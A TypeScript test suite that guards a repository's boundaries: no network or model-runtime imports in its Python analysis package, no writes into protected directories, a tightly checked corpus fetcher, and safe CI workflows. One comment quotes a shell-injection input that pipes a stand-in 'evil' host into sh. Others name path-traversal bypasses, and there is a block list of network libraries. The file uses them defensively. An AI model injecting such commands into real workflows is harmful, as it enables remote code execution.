import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, readdirSync, readFileSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import { cfg } from "./helpers.js";

/**
 * D9's boundary, enforced rather than asserted in prose.
 *
 * `analysis/` is allowed to exist because it measures runs that already happened. The moment
 * anything under `src/` reaches for it, or anything under `analysis/` reaches for a model or
 * the network, it has become a component of the run and D2 says delete it. Both directions are
 * checked, because the failure is cheap to introduce in either.
 */

const ROOT = cfg.root;
const ANALYSIS = join(ROOT, "analysis");

function walk(dir: string, ext: string[]): string[] {
  if (!existsSync(dir)) return [];
  const out: string[] = [];
  for (const name of readdirSync(dir)) {
    if (name === "node_modules" || name === "__pycache__" || name.startsWith(".")) continue;
    const p = join(dir, name);
    if (statSync(p).isDirectory()) out.push(...walk(p, ext));
    else if (ext.some((e) => name.endsWith(e))) out.push(p);
  }
  return out;
}

test("the analysis package exists and is a Python package, not a stub", () => {
  assert.ok(existsSync(ANALYSIS), "analysis/ is missing; D9 and the README both describe it");
  for (const f of ["pyproject.toml", "README.md", "adhd_analysis/report.py", "tests"]) {
    assert.ok(existsSync(join(ANALYSIS, f)), `analysis/${f} is missing`);
  }
  assert.ok(walk(join(ANALYSIS, "tests"), [".py"]).length >= 2, "the analysis package ships tests");
});

test("nothing under src/ imports or shells out to the analysis package", () => {
  for (const f of walk(join(ROOT, "src"), [".ts"])) {
    const body = readFileSync(f, "utf8");
    const where = relative(ROOT, f);
    assert.ok(!/adhd_analysis/.test(body), `${where} names adhd_analysis; the run must not depend on it`);
    assert.ok(!/\banalysis\/adhd/.test(body), `${where} reaches into analysis/`);
    assert.ok(
      !/\b(python3?|pytest)\b/.test(body.replace(/^\s*(\/\/|\*).*$/gm, "")),
      `${where} looks like it runs Python; the library is pure TypeScript over YAML`,
    );
  }
});

/**
 * The other direction. A local weights file is an inference client with a different delivery
 * mechanism, so the ban is on the libraries that would load one, not on the word "API".
 *
 * Scoped to the package. `analysis/scripts/fetch_corpus.py` sits outside it, is imported by
 * nothing, and has its own rules below — that separation is the reason the package's ban can stay
 * absolute while a corpus still gets onto disk.
 */
test("nothing in the analysis package imports a model runtime or the network", () => {
  const banned = [
    "torch",
    "tensorflow",
    "transformers",
    "openai",
    "anthropic",
    "requests",
    "httpx",
    "urllib",
    "socket",
    "http.client",
  ];
  const files = walk(join(ANALYSIS, "adhd_analysis"), [".py"]);
  assert.ok(files.length >= 5, `expected the analysis modules, found ${files.length}`);
  for (const f of files) {
    const body = readFileSync(f, "utf8");
    const where = relative(ROOT, f);
    for (const line of body.split("\n")) {
      const m = /^\s*(?:import|from)\s+([\w.]+)/.exec(line);
      if (!m) continue;
      const root = m[1]!.split(".")[0]!;
      assert.ok(
        !banned.includes(root) && !banned.includes(m[1]!),
        `${where} imports ${m[1]}, which would make the analysis package an inference client`,
      );
    }
  }
});

/**
 * The trainer writes a model file, so "writes nothing" is no longer the invariant. What still
 * holds is where it may write: never into `evals/`, `config/` or `prompts/`. A package that wrote
 * back into the recorded corpus could move a figure the repository quotes without a diff anyone
 * reviewed, which is the failure mode the replay baseline catches on the TypeScript side.
 */
test("the analysis package never writes into the corpus, the config or the prompts", () => {
  const protectedDirs = ["evals", "config", "prompts", "docs"];
  for (const f of walk(join(ANALYSIS, "adhd_analysis"), [".py"])) {
    const body = readFileSync(f, "utf8");
    const where = relative(ROOT, f);
    assert.ok(!/\bshutil\.rmtree\b|\bos\.remove\b|\bunlink\(\)/.test(body), `${where} deletes files`);
    for (const d of protectedDirs) {
      const re = new RegExp(`["'\`]${d}["'\`][^\\n]*(write_text|write_bytes|mkdir|open\\()`);
      assert.ok(!re.test(body), `${where} looks like it writes under ${d}/`);
    }
  }
});

/**
 * Writing is confined to the trainer's own output path. Anything else in the package that opened
 * a file for writing would be doing it as a side effect of a read, which is how a report ends up
 * mutating what it reports on.
 */
test("only the model file is written, and only by the trainer", () => {
  const writers = walk(join(ANALYSIS, "adhd_analysis"), [".py"]).filter((f) => {
    const body = readFileSync(f, "utf8");
    return /\.write_text\(|\.write_bytes\(|gzip\.open\([^)]*"wt"|open\([^)]*["']w/.test(body);
  });
  const names = writers.map((f) => relative(ANALYSIS, f)).sort();
  // `text/transformer.py` is on this list for the same reason `text/ngram.py` is: it holds the
  // `save`/`load` pair for its own model class. The trainers that call it do not open files.
  const allowed = [
    "adhd_analysis/ngram.py",
    "adhd_analysis/text/ngram.py",
    "adhd_analysis/text/train.py",
    "adhd_analysis/text/train_transformer.py",
    "adhd_analysis/text/transformer.py",
  ];
  assert.deepEqual(names, allowed.filter((n) => names.includes(n)), `unexpected writer: ${names.join(", ")}`);
});

/**
 * The maintenance agents are the scheduled jobs' hands. They sit outside a run by construction,
 * and the one thing that would undo that is a tool grant letting them start one.
 */
test("the maintenance agents cannot spawn a run", () => {
  for (const name of ["adhd-trainer", "adhd-governor"]) {
    const p = join(ROOT, "agents", `${name}.md`);
    assert.ok(existsSync(p), `agents/${name}.md is missing`);
    const front = readFileSync(p, "utf8").split("---")[1] ?? "";
    assert.match(front, /^tools:/m, `agents/${name}.md declares no tools line`);
    assert.ok(!/\b(Task|Agent)\b/.test(front), `agents/${name}.md can spawn agents`);
  }
  const governor = readFileSync(join(ROOT, "agents", "adhd-governor.md"), "utf8").split("---")[1] ?? "";
  assert.ok(!/\bBash\b/.test(governor), "the governor has Bash; a ceiling that can run the job it caps will run it");
});

test("the scheduled workflows exist and neither commits its output", () => {
  for (const name of ["train.yml", "maintenance.yml"]) {
    const wf = readFileSync(join(ROOT, ".github", "workflows", name), "utf8");
    assert.match(wf, /^on:\n(  .*\n)*  schedule:/m, `${name} is not scheduled`);
    assert.ok(!/git (commit|push)/.test(wf), `${name} pushes to the repository from an unattended job`);
    assert.ok(!/npm audit fix|--force/.test(wf), `${name} applies a dependency change unattended`);
  }
});

test("CI runs the analysis tests, and does not make them depend on the Node build", () => {
  const wf = readFileSync(join(ROOT, ".github", "workflows", "test.yml"), "utf8");
  assert.match(wf, /working-directory: analysis/, "the analysis package is not run in CI");
  assert.match(wf, /run: pytest/, "CI does not run the Python tests");
  const job = wf.slice(wf.indexOf("  analysis:"));
  assert.ok(!/npm (ci|test|run build)/.test(job), "the analysis job depends on the Node build, which is D9's tripwire");
});

/**
 * The fetcher is the single exception, and every part of the exception is checked.
 *
 * D10 banned network in a scheduled job because a job that can fetch is a job that can fetch
 * weights. The ban moved rather than lifted: exactly one file may reach the network, it is not
 * importable by the package, it talks only to an allowlisted host over https, it refuses anything
 * that is not text/plain, and it refuses the file extensions a model arrives in.
 */
test("exactly one file in analysis/ reaches the network, and it is not in the package", () => {
  const netUsers = walk(ANALYSIS, [".py"]).filter((f) =>
    /^\s*(import|from)\s+(urllib|requests|httpx|socket|http\.client)\b/m.test(readFileSync(f, "utf8")),
  );
  assert.deepEqual(
    netUsers.map((f) => relative(ANALYSIS, f)),
    ["scripts/fetch_corpus.py"],
    "the network is reachable from somewhere new; the whole D10 argument rests on it being one file",
  );

  const body = readFileSync(join(ANALYSIS, "scripts", "fetch_corpus.py"), "utf8");

  // Prefixes rather than hosts, which is tighter: `raw.githubusercontent.com` serves every public
  // repository on GitHub, so a host allowlist containing it allows all of them.
  assert.match(body, /def allowed_prefixes\(\)/, "the fetcher has no prefix allowlist");
  assert.ok(!/ALLOWED_HOSTS/.test(body), "the fetcher is back to a host allowlist, which is looser");
  assert.match(body, /no allowlisted prefix matches/, "nothing refuses a URL outside the allowlist");
  assert.match(body, /prefixes=\("https:\/\//, "a source declares no https prefix");

  assert.match(body, /url\.startswith\("https:\/\/"\)/, "the fetcher does not require https");
  assert.match(body, /ctype != "text\/plain"/, "the fetcher does not require text/plain");

  // Both bypasses of the prefix check, each of which passed a version of it. A `startswith` alone
  // admits `.../peps/main/peps/../../../evil/...`, and a check that forgets to decode admits `%2e%2e`.
  assert.match(body, /path traversal/, "nothing refuses a `..` segment");
  assert.match(body, /unquote/, "the path is compared without being decoded, so %2e%2e bypasses it");
  assert.match(body, /posixpath\.normpath/, "the prefix comparison runs on an unnormalised path");

  for (const ext of [".safetensors", ".gguf", ".ckpt", ".pt", ".onnx", ".bin"])
    assert.ok(body.includes(`"${ext}"`), `the fetcher does not refuse ${ext}`);

  // Every corpus records where its terms were checked. A fetcher that pulls text under terms nobody
  // wrote down is the licensing equivalent of an unbudgeted download.
  assert.match(body, /licence_url/, "a source records no licence url");

  // Importable from the package would make the exception meaningless: the package's own ban is
  // enforced by import, so a re-export would carry the network straight back in.
  const pkg = walk(join(ANALYSIS, "adhd_analysis"), [".py"]).map((f) => readFileSync(f, "utf8")).join("\n");
  assert.ok(!/fetch_corpus/.test(pkg), "the analysis package references the fetcher");
});

test("the training workflow fetches before it trains, and caches what it fetched", () => {
  const wf = readFileSync(join(ROOT, ".github", "workflows", "train.yml"), "utf8");
  assert.match(wf, /fetch_corpus\.py/, "the weekly job trains on repository prose alone");
  assert.match(wf, /actions\/cache/, "the weekly job re-downloads the whole corpus every week");
  assert.ok(wf.indexOf("fetch_corpus.py") < wf.indexOf("adhd_analysis.text.train"), "it trains before it fetches");
});

test("no workflow interpolates an expression into a shell script", () => {
  // `${{ }}` inside `run:` is textual substitution before the shell sees it, so an input of
  // `1500" ; curl evil | sh ; echo "` closes the quotes and runs. Through `env:` the same value is a
  // shell variable and cannot. Every one of these is behind write access today; the pattern is what
  // stops being safe the day a trigger widens, which is why this is a test and not a review note.
  //
  // `env:`, `with:`, `key:` and `if:` are YAML values rather than script, so only `run:` is scanned.
  const dir = join(ROOT, ".github", "workflows");
  for (const file of readdirSync(dir).filter((f) => f.endsWith(".yml"))) {
    const lines = readFileSync(join(dir, file), "utf8").split("\n");
    let indent: number | null = null;
    lines.forEach((line, i) => {
      const open = /^(\s*)(?:- )?(?:name:.*\n)?\s*run: *[|>]/.exec(line);
      if (open) { indent = open[1]!.length; return; }
      if (indent === null) return;
      const width = line.length - line.trimStart().length;
      if (line.trim() && width <= indent) { indent = null; return; }
      if (line.trimStart().startsWith("#")) return;
      assert.ok(
        !/\$\{\{/.test(line),
        `${file}:${i + 1} interpolates an expression into a shell script: ${line.trim()}`,
      );
    });
  }
});

test("the weekly job trains on one side of the split and scores the other", () => {
  // Without `--held-out-every` the trainer reads the whole manifest and the next step scores one
  // document in twenty of that same manifest. That is a memorisation score wearing the name
  // "held-out perplexity", and on the real corpus it was off by a factor of four: 26.29 on unseen
  // text against 6.51 on seen, with OOV 0.79% against 0.15%. D13 wrote the rule down, SplitLibrary
  // enforced it inside compare_orders, and two headline figures came from the path that skipped it.
  const wf = readFileSync(join(ROOT, ".github", "workflows", "train.yml"), "utf8");
  const every = wf.match(/--held-out-every (\d+)/);
  assert.ok(every, "the train step does not hold anything out, so its perplexity is a memorisation score");
  const scored = wf.match(/SplitLibrary\(Library\.load\("corpora\.yaml"\), every=(\d+), side="heldout"\)/);
  assert.ok(scored, "the held-out step does not score a stride of the manifest");
  assert.equal(scored![1], every![1], "the scored stride differs from the trained stride, so the sides overlap");
});

test("the weekly job writes the corpus where corpora.yaml reads it", () => {
  // `--out` is the parent directory and the fetcher gives each source its own subdirectory, so
  // `--out corpora/rfc` writes `corpora/rfc/rfc/*.txt` while the manifest reads `corpora/rfc/*.txt`.
  // Every third-party entry in that manifest is `required: false`, so nothing fails: the loader
  // shrugs and the job trains on ~250KB of repository prose. The class of bug is a path error
  // upstream of an optional input, and the only thing that catches it is a check that the input
  // arrived. This one was caught before the weekly cron had fired once, so no model was built from
  // it; that was luck about timing rather than anything the repository did.
  const wf = readFileSync(join(ROOT, ".github", "workflows", "train.yml"), "utf8");
  const out = wf.match(/fetch_corpus\.py[\s\S]{0,200}?--out (\S+)/);
  assert.ok(out, "the fetch step passes no --out");
  assert.equal(out![1], "corpora", "--out must be the parent directory, not one source's directory");

  const manifest = readFileSync(join(ANALYSIS, "corpora.yaml"), "utf8");
  for (const name of ["rfc", "pep", "eip", "erc"]) {
    assert.match(manifest, new RegExp(`path: corpora/${name}\\b`), `the manifest does not read corpora/${name}`);
  }
  assert.match(wf, /the fetched corpus reaches the trainer/, "nothing fails the job when the fetch lands nowhere");
});
